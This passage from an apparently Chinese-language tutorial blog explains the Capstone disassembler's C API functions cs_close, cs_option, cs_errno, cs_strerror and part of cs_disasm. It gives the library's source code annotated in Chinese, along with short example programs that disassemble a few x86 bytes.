title="cs_close"></a>cs_close</h3><p><code>cs_err CAPSTONE_API cs_close(csh *handle);</code></p><p>释放句柄<br>参数<br>handle: 指向一个cs_open()打开的句柄<br>return: 释放成功返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>实现代码，可以看出释放句柄实质为将句柄值设置为0</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_close</span><span class="params">(csh *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">ud</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">next</span>, *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*handle == <span class="number">0</span>)</span><br><span class="line"><span class="comment">// 句柄不可用</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_CSH;</span><br><span class="line"></span><br><span class="line">ud = (struct cs_struct *)(*handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ud-&gt;printer_info)</span><br><span class="line">cs_mem_free(ud-&gt;printer_info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放自定义助记符的链接list</span></span><br><span class="line">tmp = ud-&gt;mnem_list;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line">next = tmp-&gt;next;</span><br><span class="line">cs_mem_free(tmp);</span><br><span class="line">tmp = next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(ud-&gt;insn_cache);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(ud, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line">cs_mem_free(ud);</span><br><span class="line"></span><br><span class="line"><span class="comment">// handle值设置为0，保证这个句柄在cs_close()释放后不可使用</span></span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例：<br><code>cs_close(&amp;handle);</code></p><h3 id="cs-option"><a href="#cs-option" class="headerlink" title="cs_option"></a>cs_option</h3><p><code>cs_err CAPSTONE_API cs_option(csh handle, cs_opt_type type, size_t value);</code></p><p>反编译引擎的运行时选项</p><p>handle: cs_open()打开的句柄<br>type: 设置选项的类型<br>value: 与type对应的选项值<br>return: 设置成功返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>注意: 在CS_OPT_MEM的情况下，handle可以是任何值，因此cs_option(handle, CS_OPT_MEM, value)必须在cs_open()之前被调用</p><p>实现代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_option</span><span class="params">(csh ud, cs_opt_type type, <span class="keyword">size_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line">cs_opt_mnem *opt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持在所有API前支持 (even cs_open())</span></span><br><span class="line"><span class="keyword">if</span> (type == CS_OPT_MEM) &#123;</span><br><span class="line">cs_opt_mem *mem = (cs_opt_mem *)value;</span><br><span class="line"></span><br><span class="line">cs_mem_malloc = mem-&gt;<span class="built_in">malloc</span>;</span><br><span class="line">cs_mem_calloc = mem-&gt;<span class="built_in">calloc</span>;</span><br><span class="line">cs_mem_realloc = mem-&gt;<span class="built_in">realloc</span>;</span><br><span class="line">cs_mem_free = mem-&gt;<span class="built_in">free</span>;</span><br><span class="line">cs_vsnprintf = mem-&gt;vsnprintf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle)</span><br><span class="line"><span class="keyword">return</span> CS_ERR_CSH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(type) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_UNSIGNED:</span><br><span class="line">handle-&gt;imm_unsigned = (cs_opt_value)value;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_DETAIL:</span><br><span class="line">handle-&gt;detail = (cs_opt_value)value;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_SKIPDATA:</span><br><span class="line">handle-&gt;skipdata = (value == CS_OPT_ON);</span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata) &#123;</span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_size == <span class="number">0</span>) &#123;</span><br><span class="line">handle-&gt;skipdata_size = skipdata_size(handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_SKIPDATA_SETUP:</span><br><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">handle-&gt;skipdata_setup = *((cs_opt_skipdata *)value);</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_MNEMONIC:</span><br><span class="line">opt = (cs_opt_mnem *)value;</span><br><span class="line"><span class="keyword">if</span> (opt-&gt;id) &#123;</span><br><span class="line"><span class="keyword">if</span> (opt-&gt;mnemonic) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加新指令或替换现有指令</span></span><br><span class="line"><span class="comment">// 查看当前insn释放在list中</span></span><br><span class="line">tmp = handle-&gt;mnem_list;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;insn.id == opt-&gt;id) &#123;</span><br><span class="line"><span class="comment">// f找到指令，替换助记符</span></span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">strncpy</span>(tmp-&gt;insn.mnemonic, opt-&gt;mnemonic, <span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>);</span><br><span class="line">tmp-&gt;insn.mnemonic[<span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 如果没有就添加这条指令</span></span><br><span class="line"><span class="keyword">if</span> (!tmp) &#123;</span><br><span class="line">tmp = cs_mem_malloc(<span class="keyword">sizeof</span>(*tmp));</span><br><span class="line">tmp-&gt;insn.id = opt-&gt;id;</span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">strncpy</span>(tmp-&gt;insn.mnemonic, opt-&gt;mnemonic, <span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>);</span><br><span class="line">tmp-&gt;insn.mnemonic[<span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="comment">// 新指令放在list最前面</span></span><br><span class="line">tmp-&gt;next = handle-&gt;mnem_list;</span><br><span class="line">handle-&gt;mnem_list = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct insn_mnem *prev, *tmp;</span><br><span class="line"></span><br><span class="line">tmp = handle-&gt;mnem_list;</span><br><span class="line">prev = tmp;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;insn.id == opt-&gt;id) &#123;</span><br><span class="line"><span class="comment">// 删除指令</span></span><br><span class="line"><span class="keyword">if</span> (tmp == prev) &#123;</span><br><span class="line">handle-&gt;mnem_list = tmp-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">prev-&gt;next = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">cs_mem_free(tmp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">prev = tmp;</span><br><span class="line">tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_MODE:</span><br><span class="line"><span class="comment">// 验证所请求的模式是否有效</span></span><br><span class="line"><span class="keyword">if</span> (value &amp; cs_arch_disallowed_mode_mask[handle-&gt;arch]) &#123;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OPTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cs_arch_option[handle-&gt;arch](handle, type, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例，更改反汇编后显示的语法：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT);  <span class="comment">// 以AT&amp;T语法显示</span></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2019/07/22/5d35b1e72c20515640.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/22/5d35b1e72c20515640.jpg" class="lazyload"></a></p><h3 id="cs-errno"><a href="#cs-errno" class="headerlink" title="cs_errno"></a>cs_errno</h3><p><code>cs_err CAPSTONE_API cs_errno(csh handle);</code></p><p>API出错时返回错误消息<br>参数<br>handle: cs_open()打开的句柄<br>return: 无错误返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>实现很简单，判断到句柄不存在直接返回CS_ERR_CSH</p><p>示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; cs_errno(handle);    <span class="comment">//关闭句柄后检查将报错</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出，错误码4即CS_ERR_CSH<br><a href="https://i.loli.net/2019/07/22/5d35bad79c9c384228.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/22/5d35bad79c9c384228.jpg" class="lazyload"></a></p><h3 id="cs-strerror"><a href="#cs-strerror" class="headerlink" title="cs_strerror"></a>cs_strerror</h3><p><code>const char * CAPSTONE_API cs_strerror(cs_err code);</code></p><p>将上个API输出的错误码转换为详细错误信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> * CAPSTONE_API <span class="title">cs_strerror</span><span class="params">(cs_err code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(code) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Unknown error code"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_OK:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"OK (CS_ERR_OK)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MEM:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Out of memory (CS_ERR_MEM)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_ARCH:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid/unsupported architecture(CS_ERR_ARCH)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_HANDLE:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid handle (CS_ERR_HANDLE)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_CSH:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid csh (CS_ERR_CSH)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MODE:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid mode (CS_ERR_MODE)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_OPTION:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid option (CS_ERR_OPTION)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_DETAIL:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Details are unavailable (CS_ERR_DETAIL)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MEMSETUP:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Dynamic memory management uninitialized (CS_ERR_MEMSETUP)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_VERSION:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Different API version between core &amp; binding (CS_ERR_VERSION)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_DIET:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Information irrelevant in diet engine (CS_ERR_DIET)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_SKIPDATA:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Information irrelevant for 'data' instruction in SKIPDATA mode (CS_ERR_SKIPDATA)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_ATT:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"AT&amp;T syntax is unavailable (CS_ERR_X86_ATT)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_INTEL:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"INTEL syntax is unavailable (CS_ERR_X86_INTEL)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_MASM:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"MASM syntax is unavailable (CS_ERR_X86_MASM)"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例，结合cs_errno使用：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; cs_strerror(cs_errno(handle));  <span class="comment">//直接输出报错信息</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/22/5d35bc1db170a33360.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/22/5d35bc1db170a33360.jpg" class="lazyload"></a></p><h3 id="cs-disasm"><a href="#cs-disasm" class="headerlink" title="cs_disasm"></a>cs_disasm</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> CAPSTONE_API <span class="title">cs_disasm</span><span class="params">(csh handle,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *code, <span class="keyword">size_t</span> code_size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> address,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_insn **insn)</span></span>;</span><br></pre></td></tr></table></figure></div><p>给定缓冲区、大小、地址和编号，反编译机器码<br>API动态地分配内存来包含分解的指令，生成的指令将放在*insn中</p><p>注意： 必须释放分配的内存，以避免内存泄漏。对于需要动态分配稀缺内存的系统(如OS内核或固件)，API cs_disasm_iter()可能是比cs_disasm()更好的选择。原因是，使用cs_disasm()时，基于有限的可用内存，必须预先计算要分解多少条指令。</p><p>handle: cs_open()返回的句柄<br>code: 包含要反汇编的机器码的缓冲区。<br>code_size:上面代码缓冲区的大小。<br>address:给定原始代码缓冲区中的第一条指令的地址。<br>insn: 由这个API填写的指令数组。注意: insn将由这个函数分配，应该用cs_free () API释放<br>count: 需要分解的指令数量，或输入0分解所有指令<br>return:成功反汇编指令的数量，如果该函数未能反汇编给定的代码，则为0，失败时，调用cs_errno()获取错误代码。</p><p>源码分析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> CAPSTONE_API <span class="title">cs_disasm</span><span class="params">(csh ud, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">uint64_t</span> offset, <span class="keyword">size_t</span> count, cs_insn **insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line">MCInst mci;</span><br><span class="line"><span class="keyword">uint16_t</span> insn_size;</span><br><span class="line"><span class="keyword">size_t</span> c = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> f = <span class="number">0</span>;<span class="comment">// 缓存中下一条指令的索引</span></span><br><span class="line">cs_insn *insn_cache;<span class="comment">// 缓存反汇编后的指令</span></span><br><span class="line"><span class="keyword">void</span> *total = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_size = <span class="number">0</span>;<span class="comment">//所有insn的输出缓冲区的总大小</span></span><br><span class="line"><span class="keyword">bool</span> r;</span><br><span class="line"><span class="keyword">void</span> *tmp;</span><br><span class="line"><span class="keyword">size_t</span> skipdata_bytes;</span><br><span class="line"><span class="keyword">uint64_t</span> offset_org; <span class="comment">// 保存缓冲区的所有原始信息</span></span><br><span class="line"><span class="keyword">size_t</span> size_org;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *buffer_org;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cache_size = INSN_CACHE_SIZE;</span><br><span class="line"><span class="keyword">size_t</span> next_offset;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle) &#123;</span><br><span class="line"><span class="comment">// 修复方式:</span></span><br><span class="line"><span class="comment">// handle-&gt;errnum = CS_ERR_HANDLE;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重设ARM架构的IT block</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_ARM)</span><br><span class="line">handle-&gt;ITBlock.size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_USE_SYS_DYN_MEM</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; count &lt;= INSN_CACHE_SIZE)</span><br><span class="line">cache_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>) count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存SKIPDATA原始偏移量</span></span><br><span class="line">buffer_org = buffer;</span><br><span class="line">offset_org = offset;</span><br><span class="line">size_org = size;</span><br><span class="line"></span><br><span class="line">total_size = <span class="keyword">sizeof</span>(cs_insn) * cache_size;</span><br><span class="line">total = cs_mem_malloc(total_size);</span><br><span class="line"><span class="keyword">if</span> (total == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">// 内存不足</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insn_cache = total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">MCInst_Init(&amp;mci);</span><br><span class="line">mci.csh = handle;</span><br><span class="line"></span><br><span class="line">mci.address = offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line"><span class="comment">//给detail指针分配内存</span></span><br><span class="line">insn_cache-&gt;detail = cs_mem_malloc(<span class="keyword">sizeof</span>(cs_detail));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">insn_cache-&gt;detail = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为non-detailed模式保存所有信息</span></span><br><span class="line">mci.flat_insn = insn_cache;</span><br><span class="line">mci.flat_insn-&gt;address = offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="comment">//mnemonic &amp; op_str0填充</span></span><br><span class="line">mci.flat_insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">mci.flat_insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">r = handle-&gt;disasm(ud, buffer, size, &amp;mci, &amp;insn_size, offset, handle-&gt;getinsn_info);</span><br><span class="line"><span class="keyword">if</span> (r) &#123;</span><br><span class="line">SStream ss;</span><br><span class="line">SStream_Init(&amp;ss);</span><br><span class="line"></span><br><span class="line">mci.flat_insn-&gt;size = insn_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将内部指令操作码映射到公共insn ID</span></span><br><span class="line">handle-&gt;insn_id(handle, insn_cache, mci.Opcode);</span><br><span class="line"></span><br><span class="line">handle-&gt;printer(&amp;mci, &amp;ss, handle-&gt;printer_info);</span><br><span class="line">fill_insn(handle, insn_cache, ss.buffer, &amp;mci, handle-&gt;post_printer, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整opcode (X86)</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_X86)</span><br><span class="line">insn_cache-&gt;id += mci.popcode_adjust;</span><br><span class="line"></span><br><span class="line">next_offset = 